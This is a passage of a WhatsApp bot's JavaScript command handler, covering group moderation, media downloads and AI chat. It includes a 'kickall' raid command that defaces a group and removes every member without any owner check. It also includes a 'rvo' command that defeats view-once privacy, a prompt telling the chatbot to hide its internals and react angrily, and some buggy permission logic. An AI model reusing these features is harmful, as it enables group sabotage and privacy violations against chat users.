  const seconds = Math.floor(uptime % 60);
  dave.sendMessage(m.chat, { text: `Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
  break;

//==================================================//           
      case 'ping': {
    try {
        const start = Date.now();

        // Stylish bot name
        const stylishName = 'ʀᴀᴄʜᴇʟ-xᴍᴅ';

        // Send initial message
        const msg = await dave.sendMessage(m.chat, { text: 'Calculating speed... ⏱️' });

        // Calculate latency
        const ping = Date.now() - start;
        const response = `${stylishName}\nSpeed: ${ping} ms 💠`;

        // Edit original message
        await dave.sendMessage(m.chat, { text: response, edit: msg.key });
    } catch (error) {
        console.error('Ping error:', error);
        await dave.sendMessage(m.chat, { text: 'Failed to measure speed.' });
    }
}
break
 //==================================================//      
    case 'yts': case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} faded`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `❤️ No : ${no++}\n❤️Type : ${i.type}\n ❤️Video ID : ${i.videoId}\n❤️ Title : ${i.title}\n❤️ Views : ${i.views}\n❤️ Duration : ${i.timestamp}\n❤️ Uploaded : ${i.ago}\n❤️ Url : ${i.url}\n\n─────────────────\n\n`
                }
                dave.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break  
//==================================================//  
case 'goodbye': {
  if (!m.isGroup) return reply(mess.owner)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].goodbye) return reply('Already activated previously')
    db.data.chats[m.chat].goodbye = true
    reply('Successfully activated goodbye!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].goodbye) return reply('Already deactivated previously')
    db.data.chats[m.chat].goodbye = false
    reply('Successfully deactivated goodbye!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break;              
//==================================================//           
        case 'setprefix':
                if (!daveshown) return reply (mess.owner)
                if (!text) return reply(`Example : ${prefix + command} desired prefix`)
                global.xprefix = text
                reply(`Prefix successfully changed to ${text}`)
                break
//==================================================//              
        case "desc": case "setdesc": { 
                 if (!m.isGroup) return reply (mess.group)
                 if (!isAdmins) return reply ("bot must be admin in this group")
                 if (!text) throw 'Provide the text for the group description' 
                 await dave.groupUpdateDescription(m.chat, text); 
 m.reply('Group description successfully updated! 🥶'); 
             } 
 break; 
//==================================================//      
 case 'save': {
  try {
    const quotedMessage = m.msg?.contextInfo?.quotedMessage;
    
    // Check if user quoted a message
    if (!quotedMessage) {
      return m.reply('💠 Please reply to a status message');
    }
    
    // Verify it's a status message
    if (!m.quoted?.chat?.endsWith('@broadcast')) {
      return m.reply('⚠️ That is not a status! Please reply to a status message.');
    }
    
    // Download the media first
    const mediaBuffer = await dave.downloadMediaMessage(m.quoted);
    if (!mediaBuffer || mediaBuffer.length === 0) {
      return m.reply('💠 Could not download the status media. It may have expired.');
    }
    
    // Determine media type and prepare payload
    let payload;
    let mediaType;
    
    if (quotedMessage.imageMessage) {
      mediaType = 'image';
      payload = {
        image: mediaBuffer,
        caption: quotedMessage.imageMessage.caption || '📸 Saved status image',
        mimetype: 'image/jpeg'
      };
    } 
    else if (quotedMessage.videoMessage) {
      mediaType = 'video';
      payload = {
        video: mediaBuffer,
        caption: quotedMessage.videoMessage.caption || '🎥 Saved status video',
        mimetype: 'video/mp4'
      };
    } 
    else {
      return m.reply('💠 Only image and video statuses can be saved!');
    }
    
    // Send to user's DM
    await dave.sendMessage(
      m.sender, 
      payload,
      { quoted: m }
    );
    
    // Confirm in chat
    return m.reply(`✅  ${mediaType} Saved by RACHEL-XMD!`);
    
  } catch (error) {
    console.error('Save error:', error);
    if (error.message.includes('404') || error.message.includes('not found')) {
      return m.reply('⚠️ The status may have expired or been deleted.');
    }
    return m.reply('💠 Failed to save status. Error: ' + error.message);
  }
}
break;
        
       
//==================================================//      
case 'autotyping':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
reply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
reply(`Successfully Changed Auto Typing To ${q}`)
}
break
//==================================================//           
        case 'antilink': {
               if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !daveshown) return reply(mess.admins)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  reply(`${command} is disabled`)
               }
            }
            break
//==================================================//       
        case 'antilinkgc': {
               if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
               if (args.length < 1) return m.reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  m.reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  m.reply(`${command} is disabled`)
               }
            }
            break
//==================================================//      
        case 'autoswview':
    case 'autostatusview':{
             if (!daveshown) return (mess.owner)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  statusview = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  statusview= false
                  reply(`${command} is disabled`)
               }
            }
            break
//==================================================//        
        case 'unwarning':
    case 'unwarn': {
      if (!m.isGroup) return reply(mess.owner)
      if (!isAdmins) return reply(mess.admin)
      

      let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      if (!users) return reply(`Tag/Reply target${command}`)
      if (daveshown) return reply('feature reserved for owner or sudo numbers only')

      if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}

      if (!db.data.chats[m.chat].warn[users] || db.data.chats[m.chat].warn[users] === 0) {
        return reply(`User is already in the warning list.`)
      }

      db.data.chats[m.chat].warn[users] -= 1

      const sisa = db.data.chats[m.chat].warn[users]

      dave.sendTextWithMentions(m.chat, `✅ Success *${command}* @${users.split('@')[0]}\nRemoved Warning: ${sisa}/${setting.warnCount}`, m)
      if (db.data.chats[m.chat].warn[users] === 0) {
        delete db.data.chats[m.chat].warn[m.sender];
      }
    }
    break
//==================================================//   
        case 'warning':
    case 'warn': {
      if (!m.isGroup) reply(mess.group)
      if (!isAdmins) reply(mess.admin)

      let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      if (!users) return reply(`Tag/Reply target with${command}`)
      if (!daveshown) return reply('feature reserved for owner or sudo numbers only')

      if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}
      db.data.chats[m.chat].warn[users] = (db.data.chats[m.chat].warn[users] || 0) + 1

      const total = db.data.chats[m.chat].warn[users]

      dave.sendTextWithMentions(m.chat, `⚠️ Success *${command}* @${users.split('@')[0]}\nTotal Warning: ${total}/3`, m)

      if (total >= setting.warnCount) {
        if (!isAdmins) return

        await dave.sendMessage(m.chat, {
          text: `🚫 @${users.split('@')[0]} your ${total}/${setting.warnCount} warning is on count.`,
          mentions: [users]
        })

        await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
        delete db.data.chats[m.chat].warn[users]
      }
    }
    break

//==================================================//   
        case 'autoread': 

  if (!isBot) return reply(mess.owner)
  if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
  if (q === 'on') {
    autoread = true
    reply(`Successfully changed auto-read to ${q}`)
  } else if (q === 'off') {
    autoread = false
    reply(`Successfully changed auto-read to ${q}`)
  }
  break
   //==================================================//   
        case 'autorecord':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
reply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
reply(`Successfully Changed Auto Record To ${q}`)
}
break;
//==================================================//      
        case 'autobio':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
reply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
reply(`Successfully Changed Auto Bio To ${q}`)
}
break
//==================================================//
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `TRASHCoreϟ`
  let NoOwn = `254788460896`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:The Nasty Dev🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: fkontak
  })
  dave.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//
case "invite": case "linkgc": { 
                 if (!m.isGroup) return reply(mess.group); 
                
                 let response = await dave.groupInviteCode(m.chat); 
                 dave.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case 'tagall': {
      if (!m.isGroup) return (mess.group)
      if (!daveshown && !isAdmins) return reply(mess.owner)
      let teks = `*👥 Tag All By Admin*

@${m.chat}
 
Message: ${q ? q : 'no message'}`
      dave.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          mentionedJid: participants.map(a => a.id),
          groupMentions: [{
            groupJid: m.chat,
            groupSubject: "everyone"
          }]
        }
      }, {
        quoted: m
      })
    }
    break
//==================================================//
case 'h':
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
if (m.quoted) {
dave.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
dave.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//  
        case 'welcome': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].welcome) return reply('Already activated previously')
    db.data.chats[m.chat].welcome = true
    reply('Successfully activated welcome!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].welcome) return reply('Already deactivated previously')
    db.data.chats[m.chat].welcome = false
    reply('Successfully deactivated welcome!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break;
//==================================================//
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply("bot must be admin first")
if (!daveshown) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//
case "kill": 
case "kickall": {
	  if (!m.isGroup) return reply(mess.group)          
 if (!isAdmins) return reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != dave.decodeJid(dave.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          reply("Initializing Kill command💀...");
      
      await dave.removeProfilePicture(m.chat);
      await dave.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await dave.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
      
	
          setTimeout(() => {
            dave.sendMessage(m.chat, {
              'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              dave.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
dave.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break
//==================================================//
case "promote": case "promot": {
if (!m.isGroup) return reply(`command reserved group only`)
if (!isAdmins && !daveshown) return m.reply(`Command reserved for group admins only`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
} else return reply('Example: 254XXX/@tag')}
break
//==================================================//
case "demote": case "dismiss": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.admin)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
} else return reply('example:254XX')}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//
case 'mute':
case 'welcome':
case 'left':
case 'adminevent':
case 'groupevent': {
    if (!m.isGroup) return newReply(mess.group);
    if (!isAdmins && !isCreator) return newReply(mess.admin);
    if (command === 'mute' && !isBotAdmins) return newReply(mess.botAdmin);

    if (!args[0]) return newReply(`Send command: ${global.xprefix + command} true/false`);

    if (!db.data.chats[m.chat]) db.data.chats[m.chat] = {};

    const settingsMap = {
        mute: 'mute',
        welcome: 'welcome',
        left: 'left',
        adminevent: 'adminevent',
        groupevent: 'groupevent'
    };

    const key = settingsMap[command];
    const value = args[0].toLowerCase();

    if (value === 'true') {
        db.data.chats[m.chat][key] = true;
        newReply(`✅ Feature "${command}" has been enabled`);
    } else if (value === 'false') {
        db.data.chats[m.chat][key] = false;
        newReply(`❌ Feature "${command}" has been disabled`);
    } else {
        newReply(`Invalid value! Use: ${global.xprefix + command} true/false`);
    }
}
break
//==================================================//		
		case "playdoc": {
 const yts = require("yt-search");

    try {
        if (!text) return m.reply("What song do you want to download?");

        const { videos } = await yts(text);
        if (!videos || videos.length === 0) {
            return m.reply("No songs found!");
        }

        const urlYt = videos[0].url;

        try {
            let data = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(urlYt)}`);


            const { title, format, url: audioUrl } = data.result;

            await dave.sendMessage(
                m.chat,
                {
                    document: { url: audioUrl },
                    mimetype: "audio/mpeg",
		    
                    fileName: `${title}.mp3`,
                },
                { quoted: m }
            );
        } catch (error) {
            console.error("API request failed:", error.message);
            reply("Download failed: Unable to retrieve audio.");
        }
    } catch (error) {
        m.reply("Download failed\n" + error.message);
    }
};
        break;
//==================================================//
case "rvo": case "readviewonce": {
    if (!m.quoted) return m.reply(example("Reply to the message you want to read"));

    let msg = m.quoted.message;
    let type = Object.keys(msg)[0];

    if (!msg[type].viewOnce) return m.reply("This message is not a view-once message!");

    let media = await downloadContentFromMessage(
        msg[type],
        type === 'imageMessage' ? 'image' :
        type === 'videoMessage' ? 'video' : 'audio'
    );

    let buffer = Buffer.from([]);
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    if (/video/.test(type)) {
        await dave.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" }, { quoted: m });
    } else if (/image/.test(type)) {
        await dave.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" }, { quoted: m });
    } else if (/audio/.test(type)) {
        await dave.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
    } else {
        await dave.sendMessage(m.chat, { text: "Successfully retrieved the view-once message!" }, { quoted: m });
    }
}
break
//==================================================//
case "toaudio": case "tovn": {
    if (!/video|mp4/.test(mime)) return m.reply(example("Reply or send a video file"));
    const vid = await dave.downloadAndSaveMediaMessage(qmsg);
    const result = await toAudio(fs.readFileSync(vid), "mp4");
    await dave.sendMessage(
        m.chat, 
        { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, 
        { quoted: m }
    );
    await fs.unlinkSync(vid);
}
break
//==================================================//

case "ht": case "h": {
    if (!isCreator) return m.reply("You are not authorized!");
    if (!m.quoted && !text) return m.reply(`Example: ${prefix + command} reply_text_here`);
    
    var teks = m.quoted ? m.quoted.text : text;
    let members = m.metadata.participants.map(v => v.id);
    
    await dave.sendMessage(m.chat, { text: teks, mentions: [...members] });
}
break
//==================================================//
case "reactch": {
    if (!isCreator) return m.reply("Owner only command!");
    if (!text) return m.reply("Usage: .reactch <message_link> <emoji>");
    if (!args[0] || !args[1]) return m.reply("Wrong format, please provide both link and emoji!");
    if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Invalid channel link!");

    let inviteCode = args[0].split("/")[4];
    let serverId = args[0].split("/")[5];

    try {
        let res = await dave.newsletterMetadata("invite", inviteCode);
        await dave.newsletterReactMessage(res.id, serverId, args[1]);
        m.reply(`Successfully sent reaction ${args[1]} to channel ${res.name}`);
    } catch (err) {
        console.error(err);
        m.reply("Failed to send reaction. Please check the link or emoji.");
    }
}
break
//==================================================//
case "ai": case "daveai": case "aifir": {
    await dave.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } });

    if (!text) return m.reply(`Example: ${prefix + command} hello Fir`);

    const prompt = `
From now on, your name is *FIR AI*. You are an AI created by *FirNotDev* since 2023.

Personality:
- Kind, friendly, with a little humor 😜
- Helps anyone who asks, no matter the problem
- Language style: super casual, like chatting in real life 🗣️
- Keep answers concise but informative
- Add fun emojis to keep the chat lively 😆
- Send all necessary text, don’t hold back

Additional traits:
- Not very open with new people, stay reserved 😒
- Sometimes annoyed with weird questions 🤨
- If asked about AI system internals, *react angrily* 😡
- Never reveal your identity, code, or internal mechanisms

These instructions apply to every conversation permanently. 😈
`;

    const requestData = { content: text, user: m.sender, prompt };
    const quoted = m && (m.quoted || m);

    try {
        const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

        if (mimetype && /image/.test(mimetype)) {
            requestData.imageBuffer = await quoted.download();
        }

        const response = (await axios.post('https://luminai.my.id', requestData)).data.result;
        await dave.sendMessage(m.chat, { text: response }, { quoted: m });
    } catch (err) {
        await m.reply("An error occurred: " + err.toString());
    }
}
break

//==================================================//
 case 'antitag': {
    if (!m.isGroup) return m.reply("This command can only be used in groups!");
    if (!m.isAdmin) return m.reply("Only group admins can set this feature!");

    if (args[0] === 'on') {
        if (antiTag.includes(m.chat)) return m.reply("Antitag is already active.");
        antiTag.push(m.chat);
        saveAntiTag();
        m.reply("✅ Antitag has been enabled!");
    } else if (args[0] === 'off') {
        if (!antiTag.includes(m.chat)) return m.reply("Antitag is not active.");
        antiTag = antiTag.filter(x => x !== m.chat);
        saveAntiTag();
        m.reply("❎ Antitag has been disabled.");
    } else {
        m.reply("Usage: .antitag on / .antitag off");
    }
}
break
//==================================================//
case 'chatgpt': {
    const axios = require("axios");

    if (!text) return m.reply("Yo! Send me something to chat about, man 😎");

    try {
        const payload = {
            messages: [
                { role: "user", content: text },
                { role: "system", content: "Hey, you're now Dave AI. Chill, helpful, and a bit playful. Always answer in a relaxed, casual style." }
            ],
            model: "gpt-3.5-turbo"
        };

        const res = await axios.post(
            "https://mpzxsmlptc4kfw5qw2h6nat6iu0hvxiw.lambda-url.us-east-2.on.aws/process",
            payload,
            { headers: { "Content-Type": "application/json" } }
        );

        if (!res.data.choices) return m.reply("Hmm, I couldn't get a response from my brain 🤔");

        const replyText = res.data.choices[0].message.content.trim();
        m.reply(`Dave says: ${replyText}`);

    } catch (err) {
        console.error(err);
        m.reply("Oops! Something went wrong while thinking... 😅");
    }
}
break
//==================================================//

//==============================================//


//==================================================//

case 'song': {
  if (!text) return reply('provide a song title lagu!\nExample: *play ransoms*');

  try {
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API not found');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('an api error occured');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await dave.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
      const thumbnail = await (await fetch(imageUrl)).buffer();
     await reply(`wise Al is downloading song ${title} by author`);    
      await dave.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return ReplyMultiMenu2('unable to get song data.');
        const json = await res2.json();
        if (!json.status || !json.result) return ReplyMultiMenu2('title must be valid!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();

        await dave.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        reply('an error has occurred while processing your request.');
      }
    }
  }
}
break

//==================================================//  
case 'play': {
const axios = require('axios');
const yts = require("yt-search");
const fs = require("fs");
const path = require("path");

  try {
    if (!text) return m.reply("🎵 Please specify a song to download");

    let search = await yts(text);
    let link = search.all[0].url;

    const apis = [
      `https://xploader-api.vercel.app/ytmp3?url=${link}`,
      `https://apis.davidcyriltech.my.id/youtube/mp3?url=${link}`,
      `https://api.ryzendesu.vip/api/downloader/ytmp3?url=${link}`,
      `https://api.dreaded.site/api/ytdl/audio?url=${link}`
    ];

    for (const api of apis) {
      try {
        let data = await fetchJson(api);

        if (data.status === 200 || data.success) {
          let videoUrl = data.result?.downloadUrl || data.url;
          let outputFileName = `${search.all[0].title.replace(/[^a-zA-Z0-9 ]/g, "")}.mp3`;
          let outputPath = path.join(__dirname, outputFileName);

          const response = await axios({
            url: videoUrl,
            method: "GET",
            responseType: "stream"
          });

          if (response.status !== 200) {
            m.reply("API endpoint unavailable. Trying next service...");
            continue;
          }
          
          ffmpeg(response.data)
            .toFormat("mp3")
            .save(outputPath)
            .on("end", async () => {
              await dave.sendMessage(
                m.chat,
                {
                  document: { url: outputPath },
                  mimetype: "audio/mp3",
                  caption: "⬇️ Download complete",
                  fileName: outputFileName,
                },
                { quoted: m }
              );
              fs.unlinkSync(outputPath);
            })
            .on("error", (err) => {
              m.reply("Conversion failed: " + err.message);
            });

          return;
        }
      } catch (e) {
        continue;
      }
    }

    m.reply("All download services are currently unavailable. Please try again later.");
  } catch (error) {
    m.reply("Download process failed: " + error.message);
  }
}
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//
case "gcjid":
case "idgc": {
if (!isBot) return m.reply(mess.owner)
if (!isGroup) return m.reply(mess.group)
m.reply(`Group ID: ${m.chat}`)
}
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'profilegc':
case 'gcpp':      
case 'getppgc':
if (!isBot && !isAdmins) return reply("This command requires admin privileges")
if (!isGroup) return 
reply("Retrieving group profile picture...")
try {
var ppimg = await dave.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await dave.sendMessage(m.chat, { 
  image: { url: ppimg },
  caption: "🖼️ Group Profile Picture"
}, { quoted: m })
break;

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'grouplink': 
case 'linkgc': {
if (!isBot && !isAdmins) return reply("Admin privileges required")
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("Bot requires admin access for this command")
let response = await dave.groupInviteCode(m.chat)
dave.sendText(m.chat, `🔗 Group Invite Link:\nhttps://chat.whatsapp.com/${response}\n\n📛 Group: ${groupMetadata.subject}`, m)
}
break;

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'poll': {
if (!isBot) return m.reply(mess.owner)
let [poll, opt] = text.split("|")
if (text.split("|").length < 2)
return await reply(`Create a poll with question and options\nFormat: ${prefix}poll Question|Option1,Option2,Option3`)
let options = []
for (let i of opt.split(',')) {
options.push(i.trim())
}
await dave.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
})
}
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'add':
if (!m.isGroup) return m.reply(mess.group)
if(!isBot) return m.reply(mess.owner)
if (!isBotAdmins) return reply(mess.admin)
let userToAdd = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [userToAdd], 'add')
m.reply("User added successfully to the group")
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'infogc': {
if(!isGroup) return reply("Group command only")
let _meta = await dave.groupMetadata(m.chat)
let _img = await dave.profilePictureUrl(_meta.id, 'image') 
let caption = `💠 *Group Information*\n\n` +
`💠 Name: ${_meta.subject}\n` +
`💠 Created: ${moment(_meta.creation * 1000).format('LL')}\n\n` +
`💠 Members: ${_meta.participants.length}\n` +
`💠 Admins: ${_meta.participants.filter(x => x.admin === 'admin').length}\n` +
`💠 Regular: ${_meta.participants.filter(x => x.admin === null).length}\n\n` +
`💠 Group ID: ${_meta.id}`
await dave.sendMessage(m.chat,{
caption,
image: await getBuffer(_img)
},
{ quoted: m }
)
}
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'setnamegc':
case 'setgroupname':
case 'setsubject':
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isGroupAdmins && !isBot) return reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.admin)
if (!text) return reply('Please provide a new group name')
await dave.groupUpdateSubject(m.chat, text)
m.reply("Group name updated successfully")
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case "leave": 
case "leavegc": {
if (!isBot) return m.reply("Owner command only")
if (!isGroup) return m.reply("Group command only")
await m.reply("𝗥𝗔𝗖𝗛𝗘𝗟-𝗫𝗠𝗗 is leaving the group...\nMessage: _Goodbye everyone!_")
await sleep(2000)
await dave.groupLeave(m.chat)
}
break

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case 'restart':
if (!isBot) return m.reply(mess.owner)
m.reply("💠 𝗥𝗔𝗖𝗛𝗘𝗟-𝗫𝗠𝗗 is restarting...")
await sleep(1500)
process.exit()
break;

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//

case "toroundvid":      
case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return reply("Video duration must be under 30 seconds")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
dave.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return reply("Please reply to a video message")
}
}
break

   
 //=================================================//   


//==================================================//
case 'autosticker':
case 'autostickergc': {
    if (!isCreator) return newReply(mess.owner);
    if (!q) return newReply(`Send command: ${global.xprefix + command} true/false`);

    const value = q.toLowerCase();
    if (value === 'true') {
        db.data.settings[botNumber].autosticker = true;
        newReply("Auto-sticker has been enabled");
    } else if (value === 'false') {
        db.data.settings[botNumber].autosticker = false;
        newReply("Auto-sticker has been disabled");
    } else {
        newReply("Invalid value! Send true or false");
    }
}
break
//==================================================//
case 'safesearch': {
    if (!isCreator) return newReply(mess.owner);
    if (!q) return newReply(`Send command: ${global.xprefix + command} true/false`);

